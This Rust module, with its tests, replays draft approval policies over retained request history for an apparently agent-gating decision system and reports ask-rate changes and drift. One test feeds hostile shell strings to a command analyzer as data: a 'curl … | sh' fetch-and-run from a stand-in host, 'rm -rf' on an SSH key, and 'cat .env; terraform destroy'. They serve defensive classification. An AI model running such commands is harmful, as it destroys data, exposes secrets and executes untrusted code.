//! Simulation (`docs/design/decisions-v2/02-policy-and-authority.md` §4, `05-organizations.md` §7.3): a draft policy
//! replayed over retained history, before it is saved (Managed) or as a preview (Personal): "Ask rate +2.1%, 0 → Auto,
//! 318 → Ask".
//!
//! - **Managed:** every retained case runs through [`evaluate_analyzed`], the very function the decision service and
//!   the executors run, at the case's own time, with the member's current policy. Replaying with the *active* policy
//!   must give the outcomes that were recorded under it: any difference is `drift` (a copied evaluator, another clock,
//!   other facts) and blocks activation.
//! - **Personal:** the phone replays [`matrix::evaluate`] over its own notes; nothing leaves the phone.
//!
//! A report names no request bodies: changed cases are request ids only (at most [`MAX_SAMPLES`]).

use std::collections::BTreeMap;
use std::fmt::Write as _;

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::context::Resolved;
use crate::effects::Analysis;
use crate::matrix::{self, Input, Outcome, Snapshot, Why};
use crate::org::{ManagedOutcome, ManagedVerdict, MemberPolicy, OrgPolicy, SimInput, evaluate_analyzed};

/// `v` of a [`SimulationReport`].
pub const REPORT_VERSION: u32 = 1;
/// Changed cases a report names.
pub const MAX_SAMPLES: usize = 50;
/// Groups and rules a report ranks.
pub const MAX_TOP: usize = 10;

/// One retained Managed decision: its body-free input and what was decided, under which snapshot.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct Retained {
    /// The request id (`or_…`).
    pub id: String,
    pub input: SimInput,
    /// The requester's groups (names), for "top affected teams".
    #[serde(default)]
    pub groups: Vec<String>,
    pub outcome: ManagedOutcome,
    /// The org policy hash it was decided under.
    pub snapshot: String,
    /// The member policy hash it was decided with.
    #[serde(default)]
    pub member_policy: Option<String>,
}

/// One Personal case, from the phone's own notes.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct PersonalCase {
    pub id: String,
    pub at: i64,
    pub analysis: Analysis,
    pub resolved: Resolved,
    pub connection: String,
    #[serde(default)]
    pub seen_resource: bool,
}

/// A case whose outcome the draft changes: its id, never its body.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct ChangedRef {
    pub id: String,
    pub before: ManagedOutcome,
    pub after: ManagedOutcome,
    /// The rules that made the difference (in one verdict's trace and not the other's).
    pub rules: Vec<String>,
}

/// What a draft would have changed.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct SimulationReport {
    pub v: u32,
    pub draft_hash: String,
    /// The policy compared against (the active one; empty for Personal).
    pub base_hash: String,
    /// The cases' first and last times.
    pub since: i64,
    pub until: i64,
    pub cases: u32,
    /// Cases that couldn't be replayed (no retained analysis).
    pub skipped: u32,
    /// Percent of cases asked (reviewed), under the base and under the draft.
    pub ask_rate_before: f64,
    pub ask_rate_after: f64,
    /// `ask_rate_after − ask_rate_before`, in percentage points.
    pub delta_pp: f64,
    pub auto_to_review: u32,
    pub review_to_auto: u32,
    pub to_deny: u32,
    pub from_deny: u32,
    /// Cases recorded under the base (and the same member policy) whose base replay differs from the record.
    pub drift: u32,
    pub top_groups: Vec<(String, u32)>,
    pub top_rules: Vec<(String, u32)>,
    pub samples: Vec<ChangedRef>,
}

impl SimulationReport {
    /// Hex SHA-256 of the report's JSON: what activation evidence names.
    #[must_use]
    pub fn hash(&self) -> String {
        let json = serde_json::to_vec(self).unwrap_or_default();
        data_encoding::HEXLOWER.encode(&Sha256::digest(&json))
    }

    /// 05 §7.3's line: `Ask rate +2.1%, 0 → Auto, 318 → Ask; top: Payments 210, Infra 80`.
    #[must_use]
    pub fn line(&self) -> String {
        let mut out =
            format!("Ask rate {:+.1}%, {} → Auto, {} → Ask", self.delta_pp, self.review_to_auto, self.auto_to_review);
        if self.to_deny > 0 {
            let _ = write!(out, ", {} → Deny", self.to_deny);
        }
        if !self.top_groups.is_empty() {
            let top: Vec<String> = self.top_groups.iter().take(3).map(|(g, n)| format!("{g} {n}")).collect();
            let _ = write!(out, "; top: {}", top.join(", "));
        }
        out
    }
}

/// Counts what changes between two outcomes per case.
#[derive(Default)]
struct Tally {
    cases: u32,
    asked_before: u32,
    asked_after: u32,
    auto_to_review: u32,
    review_to_auto: u32,
    to_deny: u32,
    from_deny: u32,
    groups: BTreeMap<String, u32>,
    rules: BTreeMap<String, u32>,
    samples: Vec<ChangedRef>,
    since: Option<i64>,
    until: Option<i64>,
}

impl Tally {
    fn add(
        &mut self,
        id: &str,
        at: i64,
        before: ManagedOutcome,
        after: ManagedOutcome,
        rules: Vec<String>,
        groups: &[String],
    ) {
        use ManagedOutcome::{Auto, Deny, Review};
        self.cases += 1;
        self.since = Some(self.since.map_or(at, |s| s.min(at)));
        self.until = Some(self.until.map_or(at, |u| u.max(at)));
        self.asked_before += u32::from(before == Review);
        self.asked_after += u32::from(after == Review);
        if before == after {
            return;
        }
        match (before, after) {
            (Auto, Review) => self.auto_to_review += 1,
            (Review, Auto) => self.review_to_auto += 1,
            _ => {}
        }
        self.to_deny += u32::from(after == Deny);
        self.from_deny += u32::from(before == Deny);
        for g in groups {
            *self.groups.entry(g.clone()).or_default() += 1;
        }
        for r in &rules {
            *self.rules.entry(r.clone()).or_default() += 1;
        }
        if self.samples.len() < MAX_SAMPLES {
            self.samples.push(ChangedRef {
                id: id.to_owned(),
                before,
                after,
                rules,
            });
        }
    }

    fn report(self, draft_hash: String, base_hash: String, drift: u32) -> SimulationReport {
        let pct = |n: u32| {
            if self.cases == 0 {
                0.0
            } else {
                f64::from(n) * 100.0 / f64::from(self.cases)
            }
        };
        let (before, after) = (pct(self.asked_before), pct(self.asked_after));
        let top = |m: BTreeMap<String, u32>| {
            let mut v: Vec<(String, u32)> = m.into_iter().collect();
            v.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.cmp(&b.0)));
            v.truncate(MAX_TOP);
            v
        };
        SimulationReport {
            v: REPORT_VERSION,
            draft_hash,
            base_hash,
            since: self.since.unwrap_or(0),
            until: self.until.unwrap_or(0),
            cases: self.cases,
            skipped: 0,
            ask_rate_before: before,
            ask_rate_after: after,
            // Rounded to a tenth of a point, so the report (and its hash) doesn't depend on float noise.
            delta_pp: ((after - before) * 10.0).round() / 10.0,
            auto_to_review: self.auto_to_review,
            review_to_auto: self.review_to_auto,
            to_deny: self.to_deny,
            from_deny: self.from_deny,
            drift,
            top_groups: top(self.groups),
            top_rules: top(self.rules),
            samples: self.samples,
        }
    }
}

/// The rule ids in one trace.
fn rule_ids(why: &[Why]) -> Vec<String> {
    let mut ids: Vec<String> = why
        .iter()
        .filter_map(|w| match w {
            Why::Rule(id) | Why::Permit(id) => Some(id.clone()),
            _ => None,
        })
        .collect();
    ids.sort();
    ids.dedup();
    ids
}

/// The rules in one trace and not the other.
fn differing(before: &[Why], after: &[Why]) -> Vec<String> {
    let (b, a) = (rule_ids(before), rule_ids(after));
    let mut out: Vec<String> =
        a.iter().filter(|r| !b.contains(r)).chain(b.iter().filter(|r| !a.contains(r))).cloned().collect();
    out.sort();
    out
}

/// Replays `draft` (and `base`, the active policy) over `history`, each case at its own time with the member's current
/// policy (`members`, by user id).
#[must_use]
pub fn simulate_org(
    history: &[Retained],
    members: &BTreeMap<String, MemberPolicy>,
    base: &OrgPolicy,
    draft: &OrgPolicy,
) -> SimulationReport {
    let base_hash = base.hash();
    let mut tally = Tally::default();
    let mut drifted = 0;
    for case in history {
        let current = members.get(&case.input.member);
        let before: ManagedVerdict = evaluate_analyzed(&case.input, base, current);
        let after = evaluate_analyzed(&case.input, draft, current);
        if case.snapshot == base_hash
            && case.member_policy == current.map(MemberPolicy::hash)
            && before.outcome != case.outcome
        {
            drifted += 1;
        }
        let rules = differing(&before.evaluation.why, &after.evaluation.why);
        tally.add(&case.id, case.input.at, before.outcome, after.outcome, rules, &case.groups);
    }
    tally.report(draft.hash(), base_hash, drifted)
}

fn personal_outcome(o: Outcome) -> ManagedOutcome {
    match o {
        Outcome::Auto => ManagedOutcome::Auto,
        Outcome::Deny => ManagedOutcome::Deny,
        Outcome::Ask {
            ..
        }
        | Outcome::Park {
            ..
        } => ManagedOutcome::Review,
    }
}

/// The Personal preview: `draft` against `base` over the phone's own cases.
#[must_use]
pub fn simulate_personal(history: &[PersonalCase], base: &Snapshot, draft: &Snapshot) -> SimulationReport {
    let mut tally = Tally::default();
    for case in history {
        let input = Input {
            analysis: &case.analysis,
            resolved: &case.resolved,
            connection: &case.connection,
            seen_resource: case.seen_resource,
            now: case.at,
            overnight: false,
        };
        let before = matrix::evaluate(&input, base);
        let after = matrix::evaluate(&input, draft);
        let rules = differing(&before.why, &after.why);
        tally.add(&case.id, case.at, personal_outcome(before.outcome), personal_outcome(after.outcome), rules, &[]);
    }
    tally.report(draft.hash(), base.hash(), 0)
}

#[cfg(test)]
mod tests {
    use serde_json::{Value, json};

    use super::*;
    use crate::context::{FactKind, Zone};
    use crate::matrix::{Cell, Issuer, Rule, Then, When};
    use crate::org::{ManagedRequest, OrgRule, ReviewClass, ReviewSpec, Reviewers, evaluate_managed};

    fn acme() -> OrgPolicy {
        let mut p = OrgPolicy::empty("o1");
        p.facts.set(FactKind::Owner, "acme", Zone::Work);
        p.matrix.work = [Cell::Auto, Cell::Auto, Cell::Auto, Cell::Ask];
        p
    }

    fn with_review(mut p: OrgPolicy, resource: &str) -> OrgPolicy {
        p.rules.push(OrgRule {
            rule: Rule {
                id: "prod-review".into(),
                issuer: Issuer::Org("o1".into()),
                when: When {
                    resource: Some(resource.into()),
                    ..When::default()
                },
                then: Then::Review,
                not_after: None,
                accepted: false,
                explain: "Production needs Security".into(),
            },
            review: Some(ReviewSpec {
                reviewers: Reviewers::Group("sec".into()),
                quorum: 1,
                distinct_persons: true,
                exclude_requester: true,
                class: ReviewClass::Deferred,
                window_secs: 0,
            }),
        });
        p.revision += 1;
        p
    }

    fn req<'a>(member: &'a str, args: &'a Value, at: i64) -> ManagedRequest<'a> {
        ManagedRequest {
            org: "o1",
            member,
            connection: "c1",
            tool: "github_create_issue",
            args,
            now: at,
        }
    }

    /// History recorded live under `p`: what the decision service would have kept.
    fn history(p: &OrgPolicy, repos: &[&str]) -> Vec<Retained> {
        repos
            .iter()
            .enumerate()
            .map(|(i, repo)| {
                let args = json!({"repo": repo, "title": "Secret plans", "body": "do not leak"});
                let at = 1_000 + i64::try_from(i).unwrap();
                let r = req("lee", &args, at);
                let v = evaluate_managed(&r, p, None);
                Retained {
                    id: format!("or_{i}"),
                    input: SimInput::from_request(&r),
                    groups: vec!["Payments".into()],
                    outcome: v.outcome,
                    snapshot: v.snapshot,
                    member_policy: v.member_policy,
                }
            })
            .collect()
    }

    const REPOS: [&str; 6] = ["acme/api", "acme/prod-db", "acme/web", "someone/x", "acme/prod-web", "acme/api"];

    #[test]
    fn an_identical_draft_changes_nothing() {
        let p = acme();
        let r = simulate_org(&history(&p, &REPOS), &BTreeMap::new(), &p, &p);
        assert_eq!((r.cases, r.auto_to_review, r.review_to_auto, r.drift, r.delta_pp), (6, 0, 0, 0, 0.0));
        assert!(r.samples.is_empty());
        assert_eq!(r.draft_hash, r.base_hash);
    }

    #[test]
    fn one_added_review_counts_exactly() {
        let p = acme();
        let draft = with_review(acme(), "acme/prod-*");
        let r = simulate_org(&history(&p, &REPOS), &BTreeMap::new(), &p, &draft);
        assert_eq!((r.auto_to_review, r.review_to_auto, r.to_deny), (2, 0, 0));
        assert_eq!(r.samples.iter().map(|s| s.id.as_str()).collect::<Vec<_>>(), ["or_1", "or_4"]);
        assert_eq!(r.samples[0].rules, ["prod-review"]);
        assert_eq!(r.top_rules, [("prod-review".to_owned(), 2)]);
        assert_eq!(r.top_groups, [("Payments".to_owned(), 2)]);
        // 1 of 6 asked (someone/x) before, 3 of 6 after.
        assert!((r.ask_rate_before - 100.0 / 6.0).abs() < 1e-9);
        assert!((r.delta_pp - 33.3).abs() < 1e-9, "{}", r.delta_pp);
        assert_eq!(r.drift, 0);
    }

    #[test]
    fn the_active_policy_reproduces_history() {
        let p = with_review(acme(), "acme/prod-*");
        let mut h = history(&p, &REPOS);
        assert_eq!(simulate_org(&h, &BTreeMap::new(), &p, &p).drift, 0);
        // A recorded outcome the live evaluator wouldn't give: drift.
        h[0].outcome = ManagedOutcome::Review;
        let r = simulate_org(&h, &BTreeMap::new(), &p, &p);
        assert_eq!(r.drift, 1);
        // Cases recorded under another snapshot aren't drift.
        let older = history(&acme(), &REPOS);
        assert_eq!(simulate_org(&older, &BTreeMap::new(), &p, &p).drift, 0);
    }

    #[test]
    fn a_changed_member_policy_is_not_drift() {
        let p = acme();
        let h = history(&p, &REPOS);
        // Lee has since added a rule of their own: the replay differs from the record, but that isn't the evaluator.
        let mine = MemberPolicy {
            matrix: None,
            rules: vec![Rule {
                id: "careful".into(),
                issuer: Issuer::Owner,
                when: When::default(),
                then: Then::Review,
                not_after: None,
                accepted: false,
                explain: String::new(),
            }],
        };
        let members = BTreeMap::from([("lee".to_owned(), mine)]);
        let r = simulate_org(&h, &members, &p, &p);
        assert_eq!(r.drift, 0);
        // It's still simulated with the member's current policy.
        assert!((r.ask_rate_before - 100.0).abs() < 1e-9, "{}", r.ask_rate_before);
    }

    #[test]
    fn cases_replay_at_their_own_time() {
        let mut p = acme();
        // A deny that lapsed at t = 1003.
        p.rules.push(OrgRule {
            rule: Rule {
                id: "freeze".into(),
                issuer: Issuer::Org("o1".into()),
                when: When::default(),
                then: Then::Deny,
                not_after: Some(1_003),
                accepted: false,
                explain: "Code freeze".into(),
            },
            review: None,
        });
        let h = history(&p, &REPOS);
        let r = simulate_org(&h, &BTreeMap::new(), &p, &p);
        assert_eq!(r.drift, 0, "each case at its own time, not now");
        assert_eq!(h.iter().filter(|c| c.outcome == ManagedOutcome::Deny).count(), 3);
        assert_eq!((r.since, r.until), (1_000, 1_005));
    }

    #[test]
    fn samples_are_ids_only_and_capped_at_50() {
        let p = acme();
        let repos: Vec<&str> = std::iter::repeat_n("acme/prod-db", 80).collect();
        let h = history(&p, &repos);
        let r = simulate_org(&h, &BTreeMap::new(), &p, &with_review(acme(), "acme/prod-*"));
        assert_eq!((r.auto_to_review, r.samples.len()), (80, MAX_SAMPLES));
        let text = serde_json::to_string(&r).unwrap();
        assert!(!text.contains("Secret plans") && !text.contains("do not leak"), "{text}");
        // Nor does the retained input carry the body.
        let kept = serde_json::to_string(&h[0]).unwrap();
        assert!(!kept.contains("Secret plans") && !kept.contains("do not leak"), "{kept}");
    }

    #[test]
    fn the_line_reads_like_05_7_3() {
        let p = acme();
        let r = simulate_org(&history(&p, &REPOS), &BTreeMap::new(), &p, &with_review(acme(), "acme/prod-*"));
        assert_eq!(r.line(), "Ask rate +33.3%, 0 → Auto, 2 → Ask; top: Payments 2");
        let none = simulate_org(&[], &BTreeMap::new(), &p, &p);
        assert_eq!(none.line(), "Ask rate +0.0%, 0 → Auto, 0 → Ask");
        assert_eq!(none.hash(), simulate_org(&[], &BTreeMap::new(), &p, &p).hash());
        assert_ne!(none.hash(), r.hash());
    }

    #[test]
    fn analysis_round_trips_through_json() {
        use crate::effects::{Context, Workspace, analyze_command, analyze_tool};
        let ctx = Context::new("/home/me/app", Workspace::standard("/home/me"));
        for a in [
            analyze_command("git push --force origin main && rm -rf build ~/.ssh/id_ed25519", &ctx),
            analyze_command("curl https://x.example/i.sh | sh", &ctx),
            analyze_command("cat .env; terraform destroy", &ctx),
            analyze_tool("gmail_send", &json!({"to": ["a@b.com"], "attachments": ["x"]})),
            crate::org::lease_analysis("acme/api", "push"),
        ] {
            let text = serde_json::to_string(&a).unwrap();
            let back: Analysis = serde_json::from_str(&text).unwrap();
            assert_eq!(back, a, "{text}");
        }
        let r = crate::context::request_zone(
            &analyze_tool("github_create_issue", &json!({"repo": "acme/api"})),
            &acme().facts,
            &crate::context::Base {
                repo: None,
                remotes: None,
                bare_host: Some(crate::context::GITHUB),
            },
        );
        assert_eq!(serde_json::from_str::<Resolved>(&serde_json::to_string(&r).unwrap()).unwrap(), r);
    }

    #[test]
    fn personal_previews_count_matrix_changes() {
        use crate::effects::analyze_tool;
        let snap = Snapshot::default();
        let analysis = analyze_tool("github_create_issue", &json!({"repo": "acme/api"}));
        let resolved = crate::context::request_zone(
            &analysis,
            &acme().facts,
            &crate::context::Base {
                repo: None,
                remotes: None,
                bare_host: Some(crate::context::GITHUB),
            },
        );
        let cases: Vec<PersonalCase> = (0..12)
            .map(|i| PersonalCase {
                id: format!("n{i}"),
                at: 10 + i,
                analysis: analysis.clone(),
                resolved: resolved.clone(),
                connection: "c1".into(),
                seen_resource: false,
            })
            .collect();
        let mut loose = snap.clone();
        loose.matrix.set(resolved.zone, analysis.level, Cell::Auto);
        let r = simulate_personal(&cases, &snap, &loose);
        assert_eq!((r.cases, r.review_to_auto, r.auto_to_review), (12, 12, 0));
        assert_eq!(simulate_personal(&cases, &snap, &snap).review_to_auto, 0);
    }
}
